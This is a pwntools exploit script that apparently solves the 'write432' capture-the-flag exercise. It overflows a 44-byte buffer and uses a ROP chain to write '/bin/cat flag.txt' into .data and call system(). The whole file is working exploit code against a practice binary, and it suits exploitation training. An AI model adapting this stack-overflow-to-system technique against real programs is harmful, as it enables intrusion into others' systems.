#!/usr/bin/python
from pwn import *
import struct

# 0x08048670: mov dword ptr [edi], ebp; ret; 
# 0x080486db: pop ebp; ret; 
# 0x080486da: pop edi; pop ebp; ret;

# 25 0x00001028     8 0x0804a028     8 --rw- .data

elf = ELF('write432')

pad = 'A'*44
ropchain  = struct.pack('<L', 0x080486da) # 0x080486da: pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x0804a028) # 25 0x00001028     8 0x0804a028     8 --rw- .data
ropchain += '/bin'
ropchain += struct.pack('<L', 0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret;

ropchain += struct.pack('<L', 0x080486da) # 0x080486da: pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x0804a02c) # 25 0x00001028     8 0x0804a02c     8 --rw- .data+0x4
ropchain += '/cat'
ropchain += struct.pack('<L', 0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret;

ropchain += struct.pack('<L', 0x080486da) # 0x080486da: pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x0804a030) # 25 0x00001028     8 0x0804a030     8 --rw- .data+0x8
ropchain += ' fla'
ropchain += struct.pack('<L', 0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret;

ropchain += struct.pack('<L', 0x080486da) # 0x080486da: pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x0804a034) # 25 0x00001028     8 0x0804a034     8 --rw- .data+0xC
ropchain += 'g.tx'
ropchain += struct.pack('<L', 0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret;

ropchain += struct.pack('<L', 0x080486da) # 0x080486da: pop edi; pop ebp; ret;
ropchain += struct.pack('<L', 0x0804a038) # 25 0x00001028     8 0x0804a038     8 --rw- .data+0x10
ropchain += 't\x00\x00\x00'
ropchain += struct.pack('<L', 0x08048670) # 0x08048670: mov dword ptr [edi], ebp; ret;

ropchain += struct.pack('<L', 0x8048430) # 0x8048430 <system@plt>
ropchain += struct.pack('<L', 0x0804a031) # 25 0x00001028     8 0x0804a034     8 --rw- .data+0xC
ropchain += struct.pack('<L', 0x0804a028) # 25 0x00001028     8 0x0804a028     8 --rw- .data
exploit = pad + ropchain

io = process(elf.path)
io.recv()
io.sendline(exploit)

flag = io.recv()
success(flag)
